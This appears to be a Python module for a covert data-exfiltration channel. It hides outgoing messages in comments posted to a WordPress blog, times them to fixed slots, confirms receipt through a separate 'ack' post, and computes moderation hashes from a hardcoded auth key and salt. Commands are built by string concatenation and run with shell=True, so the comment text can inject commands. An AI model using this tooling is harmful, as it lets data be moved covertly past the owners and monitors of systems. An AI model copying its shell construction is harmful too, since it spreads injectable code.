import subprocess
import datetime
import time
import random
import string
import hmac
import urllib.parse

class Message:
    message = ""
    message_id = ""

class Channel:
    target_blog = ""
    exfil_channel_id = 0
    ack_channel_id = 0
    exfil_channel = ""
    ack_channel = ""

class CommentResponse:
    is_success = False
    url = ""
    unapproved_index = 0
    moderation_hash = ""
    html_response_code = ""
    html_response = ""

    def __init__(self, raw_response):
        response_splitted = raw_response.split("\n")
        self.html_response = "\n".join(response_splitted[0:-1])
        response_details = response_splitted[-1]
        response_splitted = response_details.split(",")
        self.html_response_code = response_splitted[0]
        self.url = response_splitted[1]
        self.unapproved_index = get_unapproved_index_from_url(self.url)
        self.moderation_hash = get_moderation_hash_from_url(self.url)
        self.is_success = True

def submit_comment(blog_url, post_id, comment_str):
    curl_command = "curl '" + blog_url
    curl_command += """wp-comments-post.php' -H 'Connection: keep-alive' \
      -H 'Cache-Control: max-age=0' \
      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
      -H 'sec-ch-ua-mobile: ?1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'Origin: http://127.0.0.3' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
      -H 'Sec-Fetch-Site: same-origin' \
      -H 'Sec-Fetch-Mode: navigate' \
      -H 'Sec-Fetch-User: ?1' \
      -H 'Sec-Fetch-Dest: document' \
      -H 'Referer: """
    curl_command += blog_url
    curl_command += """' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      --data-raw 'author=TestName&email=test%40email.com&url=&submit=Post+Comment&comment_post_ID="""
    curl_command += str(post_id) + "&comment_parent=0&comment="
    curl_command += comment_str + "' --compressed -Ls -w \"%{http_code},%{url_effective}\"" # -o /dev/null"
    curl_output = subprocess.check_output(curl_command, shell=True)
    return CommentResponse(curl_output.decode())

def delay_to_timeslot(time_slot):
    # Waits until the next time slot

    current_date = datetime.datetime.utcnow()
    target_date = get_next_timeslot_date(current_date, time_slot)

    time_diff = target_date - current_date
    print("[INFO] Delaying for " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins")

    time.sleep(time_diff.seconds + (time_diff.microseconds / 1000000))

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

import datetime

# current_datetime = datetime.datetime.utcnow()

def get_next_timeslot_date(current_datetime, target_timeslot):
    current_minute = current_datetime.time().minute
    current_seconds = current_datetime.time().second

    minute_offset = 0
    if current_seconds >= target_timeslot:
        minute_offset += 1

    print("## minute_offset: " + str(minute_offset))
    next_datetime = current_datetime.replace(minute=current_minute, second=target_timeslot, microsecond=0)
    print("## next_datetime: " + str(next_datetime))
    next_datetime += datetime.timedelta(minutes=minute_offset)
    print("## next_datetime: " + str(next_datetime))

    return next_datetime

def get_previous_valid_timeslot_date(current_datetime, time_slot):
    # Searches for the valid timeslot location within the previous 10 minutes
    ## For example with a time_slot of 1:11, 12:57:25 becomes 12:51:11, 12:50:00 becomes 12:41:11

    time_slot_splitted = time_slot.split(":")
    time_slot_minutes = int(time_slot_splitted[0])
    time_slot_seconds = int(time_slot_splitted[1])
    
    target_date = current_datetime
    
    target_hour = target_date.time().hour
    target_minute = target_date.time().minute
    target_minute -= 10;

    if target_minute < 0:
        target_minute = 60 + target_minute
        target_hour -= 1

    if (target_minute % 10) > time_slot_minutes:
        target_minute += 10
        if target_minute > 60:
            target_minute = target_minute - 60
            target_hour += 1

    target_minute = target_minute - (target_minute % 10) + time_slot_minutes
    target_date = target_date.replace(hour=target_hour, minute=target_minute, second=time_slot_seconds, microsecond=0)

    return target_date

def compute_moderation_hash(date_str, auth_key, auth_salt):
    salt = auth_key + auth_salt
    
    assert(salt == "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1ea30c9849bfd208c9890cbf7bb56f59a20b52c4f")
    computed_hash = hmac.new(salt.encode(), date_str.encode(), 'md5').hexdigest()
    return computed_hash

def get_unapproved_index_from_url(url):
    url_parsed = urllib.parse.urlparse(url)
    queries = urllib.parse.parse_qs(url_parsed.query)

    if 'unapproved' in queries:
        return int(queries['unapproved'][0])
    else:
        return -1

def get_moderation_hash_from_url(url):
    url_parsed = urllib.parse.urlparse(url)
    queries = urllib.parse.parse_qs(url_parsed.query)

    if 'moderation-hash' in queries:
        return queries['moderation-hash'][0]
    else:
        return None

def send_data(channel, data, send_time_slot, confirm_time_slot):
    while True:
        delay_to_timeslot(send_time_slot)

        print("Triggered at: " + str(datetime.datetime.now().time()))

        response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.message)
        print(response.moderation_hash)

        if confirm_time_slot:
            delay_to_timeslot(confirm_time_slot)
            response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.message_id)
            print("## html_response: " + str(response.html_response))
            if "Duplicate" in response.html_response:
                # If it's duplicated, that means that the server successfully got the message.
                print("[INFO] Message submitted and confirmed.")
                break
            else:
                print("[INFO] Message was not received by server. Resending...")
